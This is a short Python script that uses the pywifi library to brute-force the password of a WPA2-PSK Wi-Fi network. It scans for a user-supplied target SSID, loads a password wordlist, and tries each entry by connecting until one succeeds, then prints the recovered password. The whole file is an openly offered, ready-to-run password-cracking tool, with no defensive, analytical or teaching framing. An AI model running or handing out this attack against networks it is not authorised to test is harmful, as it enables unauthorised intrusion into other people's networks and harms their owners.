import pywifi
from pywifi import const
import time

# ANSI color codes
GREEN = '\033[92m'
RESET = '\033[0m'

# Function to scan if Wi-Fi is available 
def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)  # Wait for the scan to complete
    scan_results = iface.scan_results()
    available_networks = [network.ssid for network in scan_results]
    return available_networks

# Function to connect to a Wi-Fi network
def connect_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(3)

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

# Function to load the wordlist
def load_wordlist(filename):
    with open(filename, "r") as f:
        wordlist = f.readlines()
    return [word.strip() for word in wordlist]

# Function to perform the dictionary attack
def dictionary_attack(ssid, wordlist):
    print(f"Performing dictionary attack on Wi-Fi network: {ssid}")
    print(f"Wordlist contains {len(wordlist)} passwords")

    for password in wordlist:
        print(f"Trying password: {password}")
        if connect_wifi(ssid, password):
            print(f"{GREEN}Password found: {password}{RESET}")
            return password

    print("Dictionary passwords did not match. Password not found.")
    return None

# Main function
if __name__ == "__main__":
    # Prompt for SSID and wordlist file
    target_ssid = input("Enter the SSID of the Wi-Fi network to attack: ")
    wordlist_file = input("Enter the path to the wordlist file: ")

    # Scan for available networks
    available_networks = scan_wifi()

    if target_ssid in available_networks:
        print(f"{GREEN}Network {target_ssid} is in range.{RESET}")
        # Load the wordlist
        wordlist = load_wordlist(wordlist_file)
        # Perform the dictionary attack
        dictionary_attack(target_ssid, wordlist)
    else:
        print(f"Network {target_ssid} is not in range.")
